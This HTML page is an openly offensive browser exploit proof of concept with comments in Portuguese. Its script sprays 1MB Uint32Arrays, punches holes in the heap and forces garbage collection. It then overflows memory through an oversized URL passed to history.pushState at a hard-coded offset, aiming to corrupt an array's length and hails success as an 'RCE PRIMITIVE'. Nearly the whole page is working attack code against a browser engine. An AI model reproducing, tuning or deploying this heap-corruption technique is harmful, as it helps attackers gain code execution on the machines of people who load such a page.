<!DOCTYPE html>
<html>
<head>
    <title>Titan Array Attack (Uint32Array)</title>
    <style>
        body { background-color: #001; color: #0ff; font-family: monospace; padding: 20px; }
        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #0ff; background: #000; color: #fff; cursor: pointer; margin-bottom: 10px; }
        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
        .win { background-color: #0ff; color: #000; font-weight: bold; font-size: 1.6em; padding: 15px; border: 3px solid white; }
    </style>
</head>
<body>

    <h1>Titan Array Attack</h1>
    <p>Alvo: Uint32Array de 1MB (Large Heap). Objetivo: Corromper .length</p>

    <button onclick="startArrayAttack(0)">TIRO DIRETO (Offset 709.520)</button>
    <button onclick="startArrayAttack(16)">TIRO RECUADO -16 (Tenta pegar Vector Ptr)</button>
    <button onclick="startArrayAttack(24)">TIRO RECUADO -24 (Tenta pegar Length)</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        const BASE_OFFSET = 709520;
        const OVERFLOW_AMT = 1024 * 64; 

        // 1MB em bytes = 262144 elementos de 4 bytes (Uint32)
        const ARRAY_BYTES = 1024 * 1024;
        const ELEMENT_COUNT = ARRAY_BYTES / 4; 

        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'win' ? 'class="win"' : '';
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function startArrayAttack(offsetAdjust) {
            // O offset real é a base MENOS o ajuste (para tentar acertar antes dos dados)
            let currentOffset = BASE_OFFSET - offsetAdjust;
            
            log(`--- INICIANDO ATAQUE (Offset ${currentOffset}) ---`);
            log(`Criando Uint32Arrays de 1MB (${ELEMENT_COUNT} elementos)...`);

            // 1. SPRAY
            victims = [];
            for(let i=0; i<100; i++) {
                let arr = new Uint32Array(ELEMENT_COUNT);
                // Preenche com marcador 0xCCCCCCCC
                arr[0] = 0xCCCCCCCC; 
                arr[1] = 0xDDDDDDDD;
                // Preenche o final para checar integridade
                arr[ELEMENT_COUNT - 1] = 0xEEEEEEEE;
                victims.push(arr);
            }

            // 2. BURACOS
            log("Criando buracos no Large Heap...");
            for(let i=0; i<100; i+=2) {
                victims[i] = null;
            }

            await forceGC();

            // 3. EXPLOIT
            log("Disparando Overflow...");
            setTimeout(() => {
                try {
                    let buffer = "A".repeat(currentOffset);
                    buffer += "\x01".repeat(OVERFLOW_AMT);
                    
                    history.pushState({}, "array_pwn", "/" + buffer);

                    log("Verificando arrays...");
                    checkArrays(ELEMENT_COUNT);

                } catch (e) {
                    log("Erro no Exploit: " + e.message);
                }
            }, 500);
        }

        function checkArrays(originalLen) {
            let success = false;
            for(let i=1; i<victims.length; i+=2) {
                let arr = victims[i];
                if(!arr) continue;

                // CASO 1: LENGTH CORROMPIDO (O Santo Graal)
                // Se o length mudou, ganhamos acesso a memória alheia
                if (arr.length !== originalLen) {
                    log(`!!! JACKPOT !!! Array ${i} Length Corrompido!`, 'win');
                    log(`Original: ${originalLen} | Novo: ${arr.length}`, 'win');
                    alert("RCE PRIMITIVE: ARRAY LENGTH!");
                    success = true;
                    break;
                }

                // CASO 2: DADOS CORROMPIDOS
                // Se o conteúdo mudou para 0x01010101
                if (arr[0] === 0x01010101) {
                     log(`!!! SUCESSO PARCIAL !!! Dados atingidos no Array ${i}`, 'win');
                     log("Nota: Acertamos o corpo, precisamos recuar para acertar o header.");
                     success = true;
                     break;
                }
                
                // CASO 3: PONTEIRO CORROMPIDO (Crash Potencial)
                // Se o array travar ao ler, é sinal de que zoamos o ponteiro de dados
            }

            if(!success) log("Nenhum array atingido.");
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 800));
        }
    </script>
</body>
</html>
